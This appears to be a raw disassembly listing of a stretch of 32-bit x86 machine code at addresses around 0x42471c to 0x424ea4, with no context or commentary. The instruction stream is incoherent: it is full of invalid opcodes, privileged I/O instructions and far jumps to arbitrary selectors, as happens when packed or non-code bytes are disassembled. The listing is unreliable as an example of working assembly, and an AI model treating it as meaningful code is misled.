  42471c:	call   DWORD PTR [esi]
  42471e:	jecxz  0x424764
  424720:	sbb    dl,BYTE PTR ds:0x5641bacc
  424726:	pop    ecx
  424727:	scas   eax,DWORD PTR es:[edi]
  424728:	ret    0xdcf6
  42472b:	in     al,dx
  42472c:	retf   0x2d10
  42472f:	jg     0x4247a5
  424731:	hlt    
  424732:	dec    eax
  424733:	jp     0x4246fa
  424735:	sub    BYTE PTR [eax-0x33],dh
  424738:	push   ds
  424739:	jbe    0x4246dc
  42473b:	pop    ebp
  42473c:	ret    
  42473d:	mov    dh,0xe8
  42473f:	loopne 0x4247ac
  424741:	les    edi,FWORD PTR [ebp-0x1b]
  424744:	aaa    
  424745:	xchg   esp,eax
  424746:	mov    bl,0xd5
  424748:	pop    edx
  424749:	aam    0xe2
  42474b:	mov    bh,0x2d
  42474d:	sti    
  42474e:	jne    0x42474e
  424750:	mov    ebx,DWORD PTR [ebp+0x6d]
  424753:	mov    WORD PTR [ecx-0x3b],?
  424756:	mov    cl,ah
  424758:	or     cl,BYTE PTR [edi]
  42475a:	pop    ebx
  42475b:	inc    esi
  42475c:	and    edx,DWORD PTR [ebp+0x17605ff2]
  424762:	jle    0x424703
  424764:	add    dl,bl
  424766:	mov    ?,WORD PTR [ecx-0x21101bc0]
  42476c:	cmp    DWORD PTR [ecx],esp
  42476e:	push   ebp
  42476f:	push   edi
  424770:	mov    bl,0xea
  424772:	pop    esi
  424773:	(bad)  
  424774:	pop    edi
  424775:	cmp    al,0x4
  424777:	or     bl,cl
  424779:	push   esp
  42477a:	scas   eax,DWORD PTR es:[edi]
  42477b:	in     al,dx
  42477c:	rol    DWORD PTR [eax-0x6960fbd7],0x24
  424783:	jb     0x424705
  424785:	fild   DWORD PTR [ebp+0x13]
  424788:	shl    BYTE PTR [ebx-0x45],1
  42478b:	or     DWORD PTR [ecx-0x72],edx
  42478e:	cmp    al,0xe7
  424790:	sub    BYTE PTR [ebx],dl
  424792:	inc    esi
  424793:	push   esp
  424794:	xlat   BYTE PTR ds:[ebx]
  424795:	enter  0x5063,0x7c
  424799:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42479a:	hlt    
  42479b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42479c:	xor    BYTE PTR [ecx-0xa],0x6c
  4247a0:	lock pop ebp
  4247a2:	dec    edx
  4247a3:	or     esi,ecx
  4247a5:	into   
  4247a6:	out    0x11,eax
  4247a8:	lods   al,BYTE PTR ds:[esi]
  4247a9:	xchg   esi,eax
  4247aa:	rcr    DWORD PTR [edx],0xc5
  4247ad:	jmp    DWORD PTR [esi-0x59f81b48]
  4247b3:	nop
  4247b4:	xchg   WORD PTR [esi],dx
  4247b7:	push   ecx
  4247b8:	scas   al,BYTE PTR es:[edi]
  4247b9:	fidiv  DWORD PTR [esi+0x33]
  4247bc:	mov    ah,0x8f
  4247be:	lods   al,BYTE PTR ds:[esi]
  4247bf:	cmp    ah,al
  4247c1:	inc    esp
  4247c2:	or     DWORD PTR [edi+0x1b],ecx
  4247c5:	adc    BYTE PTR [ebp-0xc79d720],bh
  4247cb:	(bad)  
  4247cc:	fiadd  WORD PTR [ecx]
	...
  4247da:	pop    esp
  4247db:	mov    edi,0xdce35063
  4247e0:	jg     0x4247a1
  4247e2:	data16 adc al,0x63
  4247e5:	sbb    al,0x9a
  4247e7:	xchg   esi,eax
  4247e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4247e9:	mov    BYTE PTR [eax+eax*8+0x1fc0001],cl
  4247f0:	add    BYTE PTR [eax],al
  4247f2:	and    al,0x2
  4247f4:	xor    esi,DWORD PTR [eax]
  4247f6:	ret    
  4247f7:	sar    BYTE PTR [edi+0x6ee67e8],1
  4247fd:	aaa    
  4247fe:	jecxz  0x424864
  424800:	dec    esp
  424801:	add    BYTE PTR [edx+ebx*8],bh
  424804:	fcomp  st(0)
  424806:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424807:	push   edi
  424808:	outs   dx,BYTE PTR ds:[esi]
  424809:	(bad)  
  42480a:	pop    ecx
  42480b:	mov    dh,0xb6
  42480d:	push   cs
  42480e:	daa    
  42480f:	mov    ebx,0x816b1ddb
  424814:	dec    esp
  424815:	sub    ebx,ebx
  424817:	mov    ebx,DWORD PTR es:[edx-0x4e]
  42481b:	cmp    DWORD PTR [eax+0x4f],esi
  42481e:	add    edx,edx
  424820:	je     0x4247de
  424822:	aas    
  424823:	out    0x17,eax
  424825:	mov    dh,0xf5
  424827:	loopne 0x42488d
  424829:	adc    ch,BYTE PTR [ecx+0x7d]
  42482c:	jge    0x4248a5
  42482e:	mov    ch,0x85
  424830:	xor    ch,ch
  424832:	inc    ecx
  424833:	add    eax,0xdef1b47e
  424838:	pop    ebp
  424839:	(bad)  
  42483a:	pop    esi
  42483b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42483c:	jecxz  0x42483b
  42483e:	adc    bl,BYTE PTR [edi]
  424840:	lock pop edi
  424842:	pop    ss
  424843:	lea    ebx,[eax-0x5c4657d9]
  424849:	or     al,0x8f
  42484b:	pop    ebx
  42484c:	out    0xa6,eax
  42484e:	mov    esp,DWORD PTR [esi+0x11d21702]
  424854:	ja     0x42488a
  424856:	push   ebx
  424857:	jge    0x424887
  424859:	(bad)  
  42485c:	mov    al,0xd2
  42485e:	jns    0x4248c7
  424860:	les    ebx,FWORD PTR [ebx]
  424862:	cmp    al,0xcf
  424864:	lahf   
  424865:	sbb    bh,BYTE PTR [ecx+0x21]
  424868:	dec    edi
  424869:	es jbe 0x424816
  42486c:	es in  al,0xc
  42486f:	mov    ebp,DWORD PTR ds:0xe46409b5
  424875:	in     eax,dx
  424876:	push   ds
  424877:	arpl   WORD PTR [ebx],dx
  424879:	adc    DWORD PTR [ebp+0x3e71bef7],edi
  42487f:	push   esp
  424880:	into   
  424881:	inc    edx
  424882:	mov    dh,0x7c
  424884:	call   0xf17b:0x94972b8c
  42488b:	int3   
  42488c:	mov    edx,0xcc0ce42b
  424891:	push   ebp
  424892:	aaa    
  424893:	dec    esp
  424894:	or     edi,ebp
  424896:	fist   WORD PTR [ecx]
  424898:	sahf   
  424899:	push   0x9e651101
  42489e:	inc    esp
  42489f:	or     DWORD PTR [eax-0x1b],edx
  4248a2:	lea    edx,[edx-0x80]
  4248a5:	cld    
  4248a6:	inc    esp
  4248a7:	int    0xb9
  4248a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4248aa:	scas   eax,DWORD PTR es:[edi]
  4248ab:	mov    esp,0xb2406ec5
  4248b0:	rcr    esp,0x11
  4248b3:	xchg   ebx,eax
  4248b4:	pop    ebx
  4248b5:	cmp    eax,0xcf917174
  4248ba:	jmp    0x3f59:0x202a29a8
  4248c1:	xor    ecx,DWORD PTR [ecx+0x28]
  4248c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4248c5:	js     0x42485e
  4248c7:	dec    esi
  4248c8:	test   ebx,ebp
  4248ca:	mov    al,ds:0x1c8e0789
  4248cf:	movhps QWORD PTR [edi+ecx*4-0x1d],xmm2
  4248d4:	inc    esp
  4248d5:	in     al,dx
  4248d6:	or     DWORD PTR [ebp+ebx*1-0x65aee8da],eax
  4248dd:	int    0x52
  4248df:	xor    cl,BYTE PTR [esi-0x7f]
  4248e2:	inc    edi
  4248e3:	retf   
  4248e4:	inc    ebp
  4248e5:	stos   BYTE PTR es:[edi],al
  4248e6:	jg     0x4248e8
  4248e8:	jo     0x4248bc
  4248ea:	out    dx,al
  4248eb:	jae    0x4248cc
  4248ed:	xchg   edx,eax
  4248ee:	call   0x97b5:0xe017544e
  4248f5:	out    0xed,al
  4248f7:	xchg   DWORD PTR [edi],eax
  4248f9:	rol    BYTE PTR [edi],cl
  4248fb:	or     DWORD PTR [edx],edx
  4248fd:	cmc    
  4248fe:	loope  0x4248d4
  424900:	xor    al,0x18
  424902:	test   al,0x6e
  424904:	dec    eax
  424905:	jne    0x424888
  424907:	xor    eax,0x260520
  42490c:	add    dl,BYTE PTR [eax+0x63]
  42490f:	cmp    esp,DWORD PTR ds:0x9b7c8755
  424915:	mov    ebx,0x7d3fec7b
  42491a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42491b:	xor    al,BYTE PTR [ecx-0x58]
  42491e:	fstp   TBYTE PTR [esi-0x8]
  424921:	cmp    eax,0xc752e59
  424926:	in     eax,0xa7
  424928:	mov    bl,0x93
  42492a:	sub    DWORD PTR [eax+0x3fb55b47],edx
  424930:	push   esi
  424931:	pop    ebx
  424932:	daa    
  424933:	mov    bh,0x26
  424935:	inc    edi
  424936:	adc    ch,BYTE PTR [edi]
  424938:	pop    edx
  424939:	cmp    eax,0x3ad4da
  42493e:	(bad)  
  42493f:	leave  
  424940:	dec    ecx
  424941:	and    BYTE PTR [esi-0x53],ah
  424944:	ja     0x42491c
  424946:	int    0xa8
  424948:	stos   BYTE PTR es:[edi],al
  424949:	(bad)  
  42494b:	fwait
  42494c:	cwde   
  42494d:	sahf   
  42494e:	outs   dx,DWORD PTR ds:[esi]
  42494f:	adc    ch,dl
  424951:	leave  
  424952:	nop
  424953:	dec    edx
  424954:	xchg   edx,eax
  424955:	cwde   
  424956:	call   0x7b61:0xd802c704
  42495d:	pop    ecx
  42495e:	dec    esi
  42495f:	lea    ebx,[edx+edi*1-0x67]
  424963:	sbb    ah,BYTE PTR [ebp+esi*2-0x6c]
  424967:	in     eax,0xdc
  424969:	adc    ebp,DWORD PTR [edx]
  42496b:	test   BYTE PTR [eax],ch
  42496d:	scas   eax,DWORD PTR es:[edi]
  42496e:	(bad)  
  42496f:	rcr    DWORD PTR ds:0x22cadd20,cl
  424975:	jb     0x424953
  424977:	jmp    0xdce27b2e
  42497c:	cmp    DWORD PTR [ebp+0x1c61410e],edi
  424982:	pop    ss
  424983:	pop    DWORD PTR ss:[ecx+0xed95670]
  42498a:	push   ds
  42498b:	xor    BYTE PTR [edx],ah
  42498d:	lahf   
  42498e:	pushf  
  42498f:	shl    al,1
  424991:	add    dl,BYTE PTR [eax-0xa]
  424994:	shr    DWORD PTR [eax],cl
  424996:	or     eax,0x2beba94c
  42499b:	xchg   ecx,eax
  42499c:	fsub   QWORD PTR [esi-0x18]
  42499f:	mov    edi,0x24c84b1e
  4249a4:	aad    0x26
  4249a6:	imul   edi,DWORD PTR [ecx],0x7bedbbbf
  4249ac:	fbld   TBYTE PTR [ebp+0x67]
  4249af:	and    DWORD PTR [eax-0x57127c1d],edi
  4249b5:	mov    esi,esp
  4249b7:	rol    BYTE PTR [ebx-0x13070e0],0xe6
  4249be:	lods   eax,DWORD PTR ds:[esi]
  4249bf:	fs dec ebp
  4249c1:	adc    BYTE PTR [edx-0x18efe878],0x33
  4249c8:	loopne 0x4249c1
  4249ca:	mov    eax,ds:0xcaa44b65
  4249cf:	xor    DWORD PTR [edi-0x4f14341b],eax
  4249d5:	or     ah,BYTE PTR [ecx+edi*1-0x20b4a658]
  4249dc:	iret   
  4249dd:	or     bl,dl
  4249df:	jmp    0x448e:0x14284244
  4249e6:	sub    al,BYTE PTR [ecx]
  4249e8:	and    ah,BYTE PTR ss:[eax+0x3bbdcc]
	...
  4249f7:	add    BYTE PTR [eax],al
  4249f9:	add    BYTE PTR [ebx+0x55],al
  4249fc:	pusha  
  4249fd:	(bad)  
  4249fe:	jbe    0x4249bf
  424a00:	out    dx,eax
  424a01:	(bad)  
  424a03:	test   al,0x37
  424a05:	stos   DWORD PTR es:[edi],eax
  424a06:	call   0x8869ad8a
  424a0b:	ret    0x1
  424a0e:	cld    
  424a0f:	add    DWORD PTR [eax],eax
  424a11:	add    ah,cl
  424a13:	fisttp DWORD PTR [ebp+0x380198f5]
  424a19:	stos   DWORD PTR es:[edi],eax
  424a1a:	aaa    
  424a1b:	xor    BYTE PTR [ebp+esi*8+0x6aa3f147],dh
  424a22:	xor    BYTE PTR [esi+0x77],dh
  424a25:	xchg   esi,eax
  424a26:	and    ch,BYTE PTR [ebp+0x1f8db69f]
  424a2c:	mov    DWORD PTR [edx-0x154e163b],0x66c2ca04
  424a36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424a37:	scas   al,BYTE PTR es:[edi]
  424a38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424a39:	dec    ebp
  424a3a:	enter  0xf635,0xdb
  424a3e:	repnz fcom QWORD PTR [ecx-0x6ed68841]
  424a45:	push   ecx
  424a46:	gs add bh,al
  424a49:	jb     0x424a9a
  424a4b:	mov    DWORD PTR [edi+0x711abd9f],ebx
  424a51:	xchg   BYTE PTR [edi],dl
  424a53:	je     0x424a82
  424a55:	repnz in al,0xa4
  424a58:	into   
  424a59:	les    ebx,FWORD PTR [edx]
  424a5b:	pop    ecx
  424a5c:	inc    edx
  424a5d:	pop    eax
  424a5e:	sbb    BYTE PTR [esi-0x3],0xf5
  424a62:	inc    ecx
  424a63:	xor    al,0x77
  424a65:	stos   BYTE PTR es:[edi],al
  424a66:	jmp    0x43800a97
  424a6b:	lds    ebx,FWORD PTR [ebx-0x711e9c1c]
  424a71:	fild   QWORD PTR [eax]
  424a73:	jb     0x424a2f
  424a75:	int3   
  424a76:	adc    al,0x89
  424a78:	jge    0x424a8a
  424a7a:	call   0x1076e6af
  424a7f:	imul   ebx,edx,0xffffffa2
  424a82:	xor    ebp,DWORD PTR [ebp+eax*2-0x700b3da7]
  424a89:	scas   al,BYTE PTR es:[edi]
  424a8a:	sbb    al,0x8b
  424a8c:	push   ebx
  424a8d:	push   ds
  424a8e:	sub    bl,bh
  424a90:	arpl   WORD PTR [ecx+edi*1],cx
  424a93:	xor    DWORD PTR [ecx-0x1916e885],edi
  424a99:	fwait
  424a9a:	loop   0x424a75
  424a9c:	xor    eax,0xea6e023
  424aa1:	retf   
  424aa2:	and    DWORD PTR [edx+0x54],ecx
  424aa5:	pop    ds
  424aa6:	or     dh,BYTE PTR [esi+0x1c]
  424aa9:	aad    0xcc
  424aab:	mov    BYTE PTR [esi],bl
  424aad:	pop    es
  424aae:	(bad)  
  424aaf:	push   eax
  424ab0:	lea    eax,[edi-0x52]
  424ab3:	retf   
  424ab4:	and    cl,ch
  424ab6:	sub    eax,DWORD PTR [eax]
  424ab8:	out    0x13,al
  424aba:	sar    esi,0x3d
  424abd:	push   0x0
  424abf:	shl    BYTE PTR [esi],1
  424ac1:	cmp    al,0xba
  424ac3:	mov    ecx,0x172a1887
  424ac8:	rcr    edi,1
  424aca:	xchg   esi,eax
  424acb:	call   0xc55602f3
  424ad0:	out    0x46,al
  424ad2:	nop
  424ad3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424ad4:	sahf   
  424ad5:	mov    ebx,DWORD PTR [esi+ecx*8-0x44]
  424ad9:	sbb    DWORD PTR [ecx+0x3f95e95f],0xffffffa6
  424ae0:	xor    esp,DWORD PTR [ebp+0x43]
  424ae3:	out    0xac,al
  424ae5:	scas   eax,DWORD PTR es:[edi]
  424ae6:	dec    eax
  424ae7:	dec    edx
  424ae8:	fstp   DWORD PTR [esi]
  424aea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424aeb:	sbb    DWORD PTR [ebp-0x42],ebx
  424aee:	loopne 0x424b1f
  424af0:	pop    esp
  424af1:	and    eax,0x4789ee04
  424af6:	jne    0x424b15
  424af8:	cwde   
  424af9:	mov    ds:0x7e59a46c,al
  424afe:	retf   0xd1c7
  424b01:	jmp    0xcf86:0xb40d998c
  424b08:	ja     0x424b84
  424b0a:	retf   0x7cd4
  424b0d:	mov    esp,0x4a4ae14
  424b12:	leave  
  424b13:	push   edi
  424b14:	mov    ds,WORD PTR [eax-0x1acae2d7]
  424b1a:	push   esi
  424b1b:	mov    ecx,0x2cc708af
  424b20:	xlat   BYTE PTR ds:[ebx]
  424b21:	sbb    BYTE PTR [esi-0x60],bl
  424b24:	std    
  424b25:	setnp  BYTE PTR ds:0x2ebc85b2
  424b2c:	jae    0x424b82
  424b2e:	and    DWORD PTR [ebp+ebp*1+0x31],edx
  424b32:	rol    BYTE PTR [esi],cl
  424b34:	sub    eax,ebp
  424b36:	xchg   esi,eax
  424b37:	push   ds
  424b38:	adc    al,0xa3
  424b3a:	(bad)
  424b3d:	in     al,0x81
  424b3f:	cmp    eax,ecx
  424b41:	add    ebp,DWORD PTR [ebx]
  424b43:	nop
  424b44:	xchg   edi,eax
  424b45:	out    dx,al
  424b46:	lods   al,BYTE PTR ds:[esi]
  424b47:	pop    ds
  424b48:	adc    DWORD PTR [ebx+0x4a],esp
  424b4b:	mov    ds:0xe02b24ff,eax
  424b50:	scas   al,BYTE PTR es:[edi]
  424b51:	mov    eax,ds:0xcfa5fa87
  424b56:	cld    
  424b57:	fiadd  DWORD PTR [ecx+0x20]
  424b5a:	add    BYTE PTR [edi+eiz*1+0x5c],cl
  424b5e:	push   0xa310c481
  424b63:	popa   
  424b64:	outs   dx,BYTE PTR ds:[esi]
  424b65:	cmp    DWORD PTR [edx],esp
  424b67:	cld    
  424b68:	mov    ds,edi
  424b6a:	dec    esp
  424b6b:	xchg   DWORD PTR [ebp-0x63],ecx
  424b6e:	xchg   al,bl
  424b70:	iret   
  424b71:	pop    ds
  424b72:	xor    esp,DWORD PTR [ecx+0x9a499cf]
  424b78:	jne    0x424b27
  424b7a:	push   ds
  424b7b:	dec    ebp
  424b7c:	or     BYTE PTR [ecx+ebx*2+0xd],cl
  424b80:	pop    ds
  424b81:	or     BYTE PTR [edx-0x30],0xee
  424b85:	mov    ds:0x759e723b,al
  424b8a:	and    dh,BYTE PTR [ecx]
  424b8c:	rol    esi,1
  424b8e:	ror    BYTE PTR [edx+eiz*8],cl
  424b91:	add    DWORD PTR [ebx+0x7bb60c6],ecx
  424b97:	addr16 mov dl,0x10
  424b9a:	jno    0x424b36
  424b9c:	adc    ecx,DWORD PTR [ebx-0x2a]
  424b9f:	lea    ecx,[edi]
  424ba1:	add    eax,0xf6f28a2a
  424ba6:	sti    
  424ba7:	retf   0x429d
  424baa:	or     ah,al
  424bac:	mov    esp,0xad1e8e5a
  424bb1:	sbb    BYTE PTR [ebp+0x440a9deb],ah
  424bb7:	jmp    DWORD PTR [ebx]
  424bb9:	leave  
  424bba:	imul   ebp,esi,0xfffffffd
  424bbd:	xor    DWORD PTR [edx-0x46],ebp
  424bc0:	daa    
  424bc1:	scas   al,BYTE PTR es:[edi]
  424bc2:	(bad)  [edi+edi*2-0x6fe98721]
  424bc9:	cmp    dh,cl
  424bcb:	mov    dl,0xd0
  424bcd:	cmp    BYTE PTR [esi+0x58efed5],cl
  424bd3:	sbb    eax,0x967adf00
  424bd8:	ret    0x166e
  424bdb:	repz cld 
  424bdd:	jle    0x424c25
  424bdf:	dec    esi
  424be0:	sub    DWORD PTR [ebp-0x157c4692],ecx
  424be6:	adc    esp,DWORD PTR [eax+0x18493e83]
  424bec:	fdivr  QWORD PTR [ebp-0x6e]
  424bef:	(bad)  
  424bf0:	sar    DWORD PTR [edi],cl
  424bf2:	pop    ss
  424bf3:	mov    WORD PTR [edx-0x5a36d0e],es
  424bf9:	sbb    DWORD PTR [edx+0x4faa9a70],0xffffffc7
  424c00:	lahf   
  424c01:	mov    cl,0xb
  424c03:	jg     0x424bd2
  424c05:	push   edx
  424c06:	shl    BYTE PTR [edx],cl
  424c08:	mov    esi,0x82c1f574
  424c0d:	fld    DWORD PTR [eax]
	...
  424c17:	add    BYTE PTR [eax],al
  424c19:	add    BYTE PTR [edi+0x2d],dl
  424c1c:	pop    es
  424c1d:	call   0xe967:0xeddfba7f
  424c24:	addr16 xor al,0xce
  424c27:	int    0x53
  424c29:	sub    eax,DWORD PTR [esp+eax*8+0x1fc0001]
  424c30:	add    BYTE PTR [eax],al
  424c32:	retf   0xc12e
  424c35:	sti    
  424c36:	loopne 0x424c32
  424c38:	jno    0x424c0f
  424c3a:	xor    cl,BYTE PTR [eax-0xe]
  424c3d:	iret   
  424c3e:	shl    DWORD PTR [ebp+0x59acb39],cl
  424c44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424c45:	lock push edi
  424c47:	fidiv  DWORD PTR [esp+esi*1-0x6e9785e0]
  424c4e:	icebp  
  424c4f:	jae    0x424c1b
  424c51:	popa   
  424c52:	jmp    0x424bde
  424c54:	xchg   dl,ch
  424c56:	js     0x424c0b
  424c58:	out    dx,eax
  424c59:	push   esp
  424c5a:	dec    ebp
  424c5b:	hlt    
  424c5c:	jae    0x424c00
  424c5e:	lods   al,BYTE PTR ds:[esi]
  424c5f:	repz pushf 
  424c61:	and    esp,DWORD PTR [ebx]
  424c63:	push   ecx
  424c64:	dec    ebp
  424c65:	and    DWORD PTR [ebp-0x3d],edx
  424c68:	sti    
  424c69:	mov    dh,0x3
  424c6b:	mov    ds:0x2dd9c77e,eax
  424c70:	and    al,0x7a
  424c72:	ins    DWORD PTR es:[edi],dx
  424c73:	test   DWORD PTR [eax],eax
  424c75:	xchg   dh,al
  424c77:	add    al,0x5f
  424c79:	push   ecx
  424c7a:	(bad)  
  424c7b:	xor    eax,0x403cdb76
  424c80:	stos   DWORD PTR es:[edi],eax
  424c81:	jb     0x424c44
  424c83:	xchg   esi,eax
  424c84:	mov    ecx,DWORD PTR [eax]
  424c86:	es push edx
  424c88:	lds    ebx,FWORD PTR [eax]
  424c8a:	ds je  0x424c76
  424c8d:	xchg   esi,eax
  424c8e:	jmp    0xbc31:0xde53b09f
  424c95:	lods   eax,DWORD PTR es:[esi]
  424c97:	jmp    0x3ae5880b
  424c9c:	rcr    BYTE PTR [ecx],1
  424c9e:	aam    0x6a
  424ca0:	dec    eax
  424ca1:	call   0xb6aa:0x245b67ca
  424ca8:	or     al,0xde
  424caa:	(bad)  
  424cab:	(bad)  
  424cac:	pop    edi
  424cad:	xor    eax,0xc7286319
  424cb2:	dec    esi
  424cb3:	sti    
  424cb4:	mov    ds:0xe58475a9,al
  424cb9:	call   0xffc6:0xe57f6e41
  424cc0:	push   esi
  424cc1:	cmp    ah,bl
  424cc3:	stc    
  424cc4:	leave  
  424cc5:	or     BYTE PTR [ebx+0x5c],dl
  424cc8:	cmp    eax,0xb3c4a7fa
  424ccd:	int    0xf1
  424ccf:	dec    bl
  424cd1:	push   ebx
  424cd2:	test   eax,0xb326418b
  424cd7:	mov    cl,0x76
  424cd9:	inc    edi
  424cda:	xchg   esp,eax
  424cdb:	sub    BYTE PTR [ecx],cl
  424cdd:	jne    0x424caa
  424cdf:	push   esp
  424ce0:	rol    ebp,cl
  424ce2:	ror    BYTE PTR [edx],1
  424ce4:	leave  
  424ce5:	dec    edx
  424ce6:	outs   dx,DWORD PTR ds:[esi]
  424ce7:	sbb    bh,BYTE PTR [edx-0xb]
  424cea:	jmp    0x424d3d
  424cec:	sbb    al,0xf8
  424cee:	xchg   edi,eax
  424cef:	inc    edx
  424cf0:	pop    edi
  424cf1:	leave  
  424cf2:	cli    
  424cf3:	sahf   
  424cf4:	mov    eax,ds:0x462ad16f
  424cf9:	dec    edx
  424cfa:	lock pop edx
  424cfc:	(bad)  
  424cfe:	pop    ds
  424cff:	nop
  424d00:	xchg   ebp,eax
  424d01:	mov    WORD PTR ds:0x89869fa1,cs
  424d07:	cs jns 0x424cf1
  424d0a:	imul   esp,DWORD PTR [edx+0x30],0xffffffce
  424d0e:	dec    edx
  424d0f:	leave  
  424d10:	xor    eax,0xd35e4b8b
  424d15:	loop   0x424d4f
  424d17:	call   0x8d35:0x8489b2eb
  424d1e:	scas   eax,DWORD PTR es:[edi]
  424d1f:	dec    edi
  424d20:	loope  0x424d46
  424d22:	mov    dh,0x6f
  424d24:	add    eax,0x8e3bc51c
  424d29:	jecxz  0x424d2d
  424d2b:	cs sahf 
  424d2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424d2e:	or     eax,0x1d69839f
  424d33:	fst    st(1)
  424d35:	rcr    BYTE PTR [eax],0xf0
  424d38:	sub    ebp,edi
  424d3a:	stos   BYTE PTR es:[edi],al
  424d3b:	imul   esp,esp,0x12fb1ffd
  424d41:	jb     0x424db4
  424d43:	loopne 0x424d7c
  424d45:	in     eax,dx
  424d46:	in     eax,dx
  424d47:	dec    ebx
  424d48:	pop    esi
  424d49:	add    BYTE PTR [edi-0x17],bl
  424d4c:	mov    dl,0x84
  424d4e:	into   
  424d4f:	sub    eax,0x4df5bafe
  424d54:	push   ebp
  424d55:	das    
  424d56:	inc    ecx
  424d57:	fdiv   DWORD PTR [eax]
  424d59:	adc    BYTE PTR [edx-0x52],dh
  424d5c:	push   es
  424d5d:	mov    ch,0x4f
  424d5f:	mov    dl,0x80
  424d61:	mov    cs,WORD PTR [edi+eax*8-0x5c]
  424d65:	pop    ds
  424d66:	fild   WORD PTR [edx]
  424d68:	enter  0x2d,0xf4
  424d6c:	ret    0x1343
  424d6f:	inc    edi
  424d70:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424d71:	and    dh,BYTE PTR [edx+0x732180f2]
  424d77:	outs   dx,DWORD PTR ds:[esi]
  424d78:	push   es
  424d79:	jle    0x424d65
  424d7b:	ror    DWORD PTR [esi],cl
  424d7d:	and    esp,DWORD PTR [ecx]
  424d7f:	pop    esp
  424d80:	and    DWORD PTR [eax-0x6a],esp
  424d83:	stc    
  424d84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424d85:	and    eax,0x12000ea5
  424d8a:	dec    ebp
  424d8b:	push   ebx
  424d8c:	idiv   BYTE PTR [ecx-0x1a]
  424d8f:	fdiv   st(3),st
  424d91:	jmp    0x424dce
  424d93:	and    eax,0xaaaeba0e
  424d98:	inc    edi
  424d99:	sub    ecx,DWORD PTR [esi]
  424d9b:	outs   dx,BYTE PTR ds:[esi]
  424d9c:	xchg   edx,eax
  424d9d:	jecxz  0x424dae
  424d9f:	xlat   BYTE PTR ds:[ebx]
  424da0:	cmp    DWORD PTR [ecx+0x71],eax
  424da3:	pop    es
  424da4:	pop    ebx
  424da5:	mov    ds:0xd99801ce,eax
  424daa:	pop    ebx
  424dab:	pmuludq mm4,mm2
  424dae:	pop    ds
  424daf:	add    ebp,DWORD PTR [ebp+0x3c58b5ea]
  424db5:	push   ecx
  424db6:	dec    edi
  424db7:	in     al,0x51
  424db9:	test   BYTE PTR [ebp+0x3d],dh
  424dbc:	adc    eax,edi
  424dbe:	retf   0xd86e
  424dc1:	out    0xfe,eax
  424dc3:	push   es
  424dc4:	mov    bh,0x6b
  424dc6:	icebp  
  424dc7:	push   0x715b9d48
  424dcc:	xlat   BYTE PTR ds:[ebx]
  424dcd:	jne    0x424e0e
  424dcf:	jnp    0x424da9
  424dd1:	mov    esi,0x1f9c24e0
  424dd6:	test   al,cl
  424dd8:	scas   eax,DWORD PTR es:[edi]
  424dd9:	jecxz  0x424e29
  424ddb:	inc    edi
  424ddc:	sbb    BYTE PTR [ebx+esi*4],0x14
  424de0:	cmp    BYTE PTR [ebp+0x20],dl
  424de3:	fs xchg ebp,eax
  424de5:	xor    DWORD PTR [edi-0x7fc2a78b],ebp
  424deb:	call   0xed1e571b
  424df0:	ja     0x424e35
  424df2:	cwde   
  424df3:	adc    BYTE PTR [ecx-0x72],dl
  424df6:	daa    
  424df7:	push   0x111712c0
  424dfc:	sub    cl,BYTE PTR [ecx+0x63]
  424dff:	xor    DWORD PTR [esi],edi
  424e01:	push   edx
  424e02:	mov    cl,0x64
  424e04:	mov    esp,edi
  424e06:	bnd jb 0x424e86
  424e09:	xchg   ebx,eax
  424e0a:	mov    edi,0xbd9827ca
  424e0f:	retf   0x2046
  424e12:	mov    ecx,0x7f8f70ff
  424e17:	pop    ecx
  424e18:	(bad)  
  424e19:	inc    ebx
  424e1a:	out    dx,eax
  424e1b:	cmc    
  424e1c:	push   ebp
  424e1d:	imul   ebp,edx,0xea4be77a
  424e23:	inc    edi
  424e24:	cmp    ch,BYTE PTR fs:[edx+0x34]
  424e28:	xchg   esi,eax
  424e29:	iret   
  424e2a:	pop    es
  424e2b:	mov    esi,es
  424e2d:	push   ds
	...
  424e3a:	ins    BYTE PTR es:[edi],dx
  424e3b:	sub    ch,BYTE PTR [ebx]
  424e3d:	outs   dx,DWORD PTR es:[esi]
  424e3f:	daa    
  424e40:	ins    DWORD PTR es:[edi],dx
  424e41:	push   0xffffffda
  424e43:	add    BYTE PTR [ecx],0x9d
  424e46:	xor    BYTE PTR [ecx-0x72],dh
  424e49:	out    dx,eax
  424e4a:	add    dh,0x1
  424e4d:	add    ah,bh
  424e4f:	add    DWORD PTR [eax],eax
  424e51:	add    BYTE PTR [ecx-0x8],bl
  424e54:	push   edi
  424e55:	mov    ds:0xa21cd27,al
  424e5a:	push   esi
  424e5b:	jge    0x424ea2
  424e5d:	jp     0x424ec3
  424e5f:	addr16 out 0x68,eax
  424e62:	adc    eax,0x934c1056
  424e67:	nop
  424e68:	mov    ch,BYTE PTR [ecx-0x61]
  424e6b:	add    al,0x70
  424e6d:	xor    al,BYTE PTR fs:[edx-0x1c]
  424e71:	push   ds
  424e72:	data16 int 0xe3
  424e75:	cmp    BYTE PTR [esi-0x22c13f2e],dl
  424e7b:	cmp    DWORD PTR [ecx+edx*2-0x653ab99f],0x6b428526
  424e86:	xchg   esp,eax
  424e87:	add    ecx,ebp
  424e89:	test   DWORD PTR [eax+0x53],esp
  424e8c:	and    BYTE PTR [ecx],cl
  424e8e:	cmp    bl,dh
  424e90:	ss test eax,0xa85292bd
  424e96:	mov    eax,ds:0xeb219c9
  424e9b:	cmp    eax,0xe1d60a59
  424ea0:	inc    ebx
  424ea1:	or     cl,cl
  424ea3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424ea4:	cmp    al,0x56
